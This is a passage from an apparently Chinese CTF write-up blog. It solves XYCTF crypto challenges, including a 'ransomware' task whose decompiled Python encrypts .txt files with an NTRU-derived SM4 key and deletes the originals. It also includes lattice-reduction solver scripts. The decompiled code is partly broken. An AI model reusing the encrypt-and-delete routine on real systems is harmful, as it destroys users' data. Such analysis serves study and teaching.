<span class="number">6091782</span>, <span class="number">7917959</span>, <span class="number">4542978</span>, <span class="number">11292940</span>, <span class="number">15442323</span>, <span class="number">10021509</span>, <span class="number">12622088</span>, <span class="number">10021509</span>, <span class="number">12622088</span>, <span class="number">5097724</span>, <span class="number">10021509</span>, <span class="number">2497145</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> trange(<span class="number">114514</span>, <span class="number">19198100</span>):  </span><br><span class="line">    inva = inverse(a, <span class="number">19198111</span>)  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):  </span><br><span class="line">        b = (enc[<span class="number">0</span>] - a * x) % <span class="number">19198111</span>  </span><br><span class="line">        <span class="keyword">if</span> b &gt; <span class="number">1145140</span> <span class="keyword">and</span> b &lt; <span class="number">19198100</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                flag = <span class="string">&#x27;&#x27;</span>.join([table[(inva * (x - b)) % <span class="number">19198111</span>] <span class="keyword">for</span> x <span class="keyword">in</span> enc])  </span><br><span class="line">                <span class="built_in">print</span>(flag)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            <span class="keyword">except</span>:  </span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><h3 id="勒索病毒（复现）"><a href="#勒索病毒（复现）" class="headerlink" title="勒索病毒（复现）"></a>勒索病毒（复现）</h3><p>给出一个exe，但是它的图标是：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102115091.png" alt="Pasted image 20250410113323"><br>看不出来是什么语言编译的，用DIE扫出来是C/C++：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102115066.png" alt="Pasted image 20250410113519"><br>拖进IDA里面看看，随便翻翻翻到：<br><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202504102115104.png" alt="Pasted image 20250410113656"><br>有段代码提到了PyInstaller，初步判断是Python编译的，用pyinstxtractor解包可以得到task.pyc和res文件夹里的enc.txt和pub_key.txt，通过pycdc反编译得到如下代码（以下代码为反编译结果经过处理得到的)：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randrange  </span><br><span class="line">  </span><br><span class="line">N = <span class="number">49</span> </span><br><span class="line">p = <span class="number">3</span>  </span><br><span class="line">q = <span class="number">128</span>  </span><br><span class="line">d = <span class="number">3</span>  </span><br><span class="line"><span class="keyword">assert</span> q &gt; (<span class="number">6</span> * d + <span class="number">1</span>) * p  </span><br><span class="line">R.&lt;x&gt; = ZZ[]  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_T</span>(<span class="params">d1, d2</span>):  </span><br><span class="line">    <span class="keyword">assert</span> N &gt;= d1 + d2  </span><br><span class="line">    s = [<span class="number">1</span>] * d1 + [-<span class="number">1</span>] * d2 + [<span class="number">0</span>] * (N - d1 - d2)  </span><br><span class="line">    shuffle(s)  </span><br><span class="line">    <span class="keyword">return</span> R(s)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_prime</span>(<span class="params">f, p</span>):  </span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N - <span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">return</span> R(lift(<span class="number">1</span> / Rp(f)))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f, g</span>):  </span><br><span class="line">    <span class="keyword">return</span> (f * g) % (x^N - <span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_mod</span>(<span class="params">f, q</span>):  </span><br><span class="line">    <span class="keyword">return</span> R([((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mod</span>(<span class="params">f, q</span>):  </span><br><span class="line">    <span class="keyword">return</span> R([f[i] % q <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_pow2</span>(<span class="params">f, q</span>):  </span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)  </span><br><span class="line">    g = invert_mod_prime(f, <span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        r = lift_mod(convolution(g, f), q)  </span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">return</span> g  </span><br><span class="line">        g = lift_mod(convolution(g, <span class="number">2</span> - r), q)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_message</span>():  </span><br><span class="line">    <span class="keyword">return</span> R([randrange(p) - <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N)])  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>():  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            f = generate_T(d + <span class="number">1</span>, d)  </span><br><span class="line">            g = generate_T(d, d)  </span><br><span class="line">            Fp = poly_mod(invert_mod_prime(f, p), p)  </span><br><span class="line">            Fq = poly_mod(invert_mod_pow2(f, q), q)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">    h = poly_mod(convolution(Fq, g), q)  </span><br><span class="line">    <span class="keyword">return</span> h, (f, g)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">m, h</span>):  </span><br><span class="line">    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)  </span><br><span class="line">    <span class="keyword">return</span> e  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_ntru_keys</span>():  </span><br><span class="line">    h, secret = generate_key()  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pub_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(<span class="built_in">str</span>(h))  </span><br><span class="line">    m = generate_message()  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;priv_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(<span class="built_in">str</span>(m))  </span><br><span class="line">    e = encrypt_message(m, h)  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(<span class="built_in">str</span>(e))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):  </span><br><span class="line">    terms = []  </span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span>  </span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:  </span><br><span class="line">        term = <span class="keyword">match</span>.group()  </span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:  </span><br><span class="line">            terms.append(<span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:  </span><br><span class="line">            terms.append(-<span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:  </span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]  </span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:  </span><br><span class="line">                coeff = <span class="number">1</span>  </span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">                coeff = -<span class="number">1</span>  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)  </span><br><span class="line">            terms.append(coeff * exponent)  </span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:  </span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:  </span><br><span class="line">                terms.append(<span class="number">1</span>)  </span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">                terms.append(-<span class="number">1</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:  </span><br><span class="line">                terms.append(<span class="number">0</span>)  </span><br><span class="line">                terms.append(-<span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">return</span> terms  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):  </span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span>  </span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:  </span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)  </span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:    </span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span>  </span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))  </span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)  </span><br><span class="line">    <span class="keyword">return</span> hex_key  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_polynomial_from_file</span>(<span class="params">filename</span>):  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:  </span><br><span class="line">        <span class="keyword">return</span> file.read().strip()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">key, plaintext</span>):  </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;SM4 key must be 16 bytes&quot;</span>  </span><br><span class="line">    cipher = sm4.CryptSM4()  </span><br><span class="line">    cipher.set_key(key, sm4.SM4_ENCRYPT)  </span><br><span class="line">    padded_plaintext = pad(plaintext, <span class="number">16</span>)  </span><br><span class="line">    <span class="keyword">return</span> cipher.crypt_ecb(padded_plaintext)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt_file</span>(<span class="params">input_path, output_path, key</span>):  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        plaintext = f.read()  </span><br><span class="line">      </span><br><span class="line">    ciphertext = sm4_encrypt(key, plaintext)  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(ciphertext)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>):  </span><br><span class="line">        base_path = sys._MEIPASS  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_directory</span>(<span class="params">directory, sm4_key, extensions=[<span class="string">&quot;.txt&quot;</span>]</span>):  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Directory does not exist: <span class="subst">&#123;directory&#125;</span>&quot;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(directory):  </span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(file.endswith(ext) <span class="keyword">for</span> ext <span class="keyword">in</span> extensions):  </span><br><span class="line">                input_path = os.path.join(root, file)  </span><br><span class="line">                output_path = input_path + <span class="string">&quot;.enc&quot;</span>  </span><br><span class="line">                <span class="keyword">try</span>:  </span><br><span class="line">                    sm4_encrypt_file(input_path, output_path, sm4_key)  </span><br><span class="line">                    os.remove(input_path)  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;input_path&#125;</span> -&gt; <span class="subst">&#123;output_path&#125;</span>&quot;</span>)  </span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Error encrypting <span class="subst">&#123;input_path&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        save_ntru_keys()  </span><br><span class="line">        poly_str = read_polynomial_from_file(<span class="string">&quot;priv_key.txt&quot;</span>)  </span><br><span class="line">        poly_terms = terms(poly_str)  </span><br><span class="line">        sm4_key = binascii.unhexlify(poly_terms)  </span><br><span class="line">        user_name = os.getlogin()  </span><br><span class="line">        target_dir = os.path.join(<span class="string">&quot;C:\\Users&quot;</span>, user_name, <span class="string">&quot;Desktop&quot;</span>, <span class="string">&quot;test_files&quot;</span>)  </span><br><span class="line">          </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):  </span><br><span class="line">            os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Created directory: <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">            txt_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(target_dir)   </span><br><span class="line">                    <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.txt&#x27;</span>) <span class="keyword">and</span> os.path.isfile(os.path.join(target_dir, f))]  </span><br><span class="line">          </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> txt_files:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No .txt files found in directory&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">            <span class="keyword">for</span> txt_file <span class="keyword">in</span> txt_files:  </span><br><span class="line">            file_path = os.path.join(target_dir, txt_file)  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                    test_data = f.read()  </span><br><span class="line">                  </span><br><span class="line">                ciphertext = sm4_encrypt(sm4_key, test_data)  </span><br><span class="line">                encrypted_path = file_path + <span class="string">&#x27;.enc&#x27;</span>  </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f.write(ciphertext)  </span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error processing <span class="subst">&#123;txt_file&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)  </span><br><span class="line">                  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Fatal error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可以看到上述代码生成一个随机多项式$m(x)$，并通过<code>terms</code>（以及反编译出来的代码中没有使用到的<code>gen_key</code>）来讲多项式转换为SM4的密钥对flag进行加密，之后使用NTRU加密多项式$m(x)$，最后将NTRU的公钥写入pub_key.txt，将NTRU的密文写入enc.txt，NTRU相关可以参考这篇博客：<a href="https://triodelzx.github.io/2025/04/09/NTRU/">NTRU | Triode Field</a>，通过如下代码就可以求解出flag：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):</span><br><span class="line">    terms = []</span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span></span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        term = <span class="keyword">match</span>.group()</span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            terms.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:</span><br><span class="line">            terms.append(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                coeff = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                coeff = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)</span><br><span class="line">            terms.append(coeff * exponent)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                terms.append(-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">0</span>)</span><br><span class="line">                terms.append(-<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> terms</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):</span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:</span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)</span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:</span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))</span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_key</span><br><span class="line"></span><br><span class="line">N = <span class="number">49</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">128</span>  </span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">_R = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">R = _R.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rp = PolynomialRing(Zmod(p), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rp = _Rp.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rq = PolynomialRing(Zmod(q), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rq = _Rq.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">center_lift</span>(<span class="params">Rm, R, f</span>):</span><br><span class="line">    modulo = ZZ(Rm(<span class="built_in">list</span>(f)).base_ring()(-<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">    l = [ZZ(x) <span class="keyword">if</span> x &lt;= modulo // <span class="number">2</span> <span class="keyword">else</span> ZZ(x) - modulo <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(f)]</span><br><span class="line">    <span class="keyword">return</span> R(l)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">Rm, f</span>):</span><br><span class="line">    <span class="keyword">return</span> Rm(f).inverse()</span><br><span class="line"></span><br><span class="line">h = R(<span class="string">&quot;...&quot;</span>)</span><br><span class="line">e = R(<span class="string">&quot;...&quot;</span>)</span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, <span class="number">2</span>*N, <span class="number">2</span>*N)</span><br><span class="line"></span><br><span class="line">h_coeff = [ZZ(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(h)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    L[i, i] = <span class="number">1</span></span><br><span class="line">    L[N + i, N + i] = q</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        L[i, N + j] = h_coeff[(j - i) % N]\</span><br><span class="line"></span><br><span class="line">res = L.BKZ()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">v = <span class="built_in">list</span>(res[:N])</span><br><span class="line">f = R([ZZ(x) <span class="keyword">for</span> x <span class="keyword">in</span> v])</span><br><span class="line">Fp = Rp(<span class="built_in">list</span>(f)).inverse()</span><br><span class="line">a = center_lift(Rq, R, Rq(<span class="built_in">list</span>(f * e)))</span><br><span class="line">m = center_lift(Rp, R, Rp(<span class="built_in">list</span>(Fp * a)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">poly_terms = terms(<span class="built_in">str</span>(m))</span><br><span class="line">key = gen_key(poly_terms)</span><br><span class="line">sm4_key = binascii.unhexlify(key)</span><br><span class="line"><span class="built_in">print</span>(sm4_key.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">sm4 = sm4.CryptSM4(sm4_key)</span><br><span class="line">sm4.set_key(sm4_key, gmssl.sm4.SM4_DECRYPT)</span><br><span class="line"></span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835&quot;</span>)</span><br><span class="line">pt = sm4.crypt_ecb(ct)</span><br><span class="line"><span class="built_in">print</span>(unpad(pt, <span class="number">16</span>))</span><br></pre></td></tr></table></figure><br>事实上，我们可以发现，在<code>enc.txt</code>中除了$e$之外还有一个多出来的多项式：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-x^<span class="number">48</span> - x^<span class="number">46</span> + x^<span class="number">45</span> + x^<span class="number">43</span> - x^<span class="number">42</span> + x^<span class="number">41</span> + x^<span class="number">40</span> + x^<span class="number">36</span> - x^<span class="number">35</span> + x^<span class="number">34</span> - x^<span class="number">33</span> + x^<span class="number">32</span> - x^<span class="number">30</span> + x^<span class="number">29</span> - x^<span class="number">28</span> - x^<span class="number">27</span> - x^<span class="number">26</span> - x^<span class="number">25</span> - x^<span class="number">23</span> - x^<span class="number">22</span> + x^<span class="number">21</span> + x^<span class="number">20</span> + x^<span class="number">19</span> + x^<span class="number">18</span> - x^<span class="number">17</span> - x^<span class="number">16</span> - x^<span class="number">15</span> - x^<span class="number">14</span> - x^<span class="number">12</span> + x^<span class="number">9</span> - x^<span class="number">7</span> - x^<span class="number">6</span> - x^<span class="number">5</span> - x^<span class="number">4</span> + x^<span class="number">3</span> - x + <span class="number">1</span></span><br></pre></td></tr></table></figure><br>这个多项式实际上就是NTRU加密一步使用的明文，也就是最后被用于转换为SM4的密钥的多项式.</p><h3 id="choice（复现）"><a href="#choice（复现）" class="headerlink" title="choice（复现）"></a>choice（复现）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)  </span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]  </span><br><span class="line">  </span><br><span class="line">msg = bytes_to_long(flag)  </span><br><span class="line">rand = Random()  </span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])  </span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>给了上面的代码还有random.py，跟Python库里面的random.py差距挺大的，但是据出题人的说法修改的是第246行，对应的是<code>_randbelow_with_getrandbits</code>函数，原本的这个函数实现如下：<br><figure class="highlight python"><table><tr><td 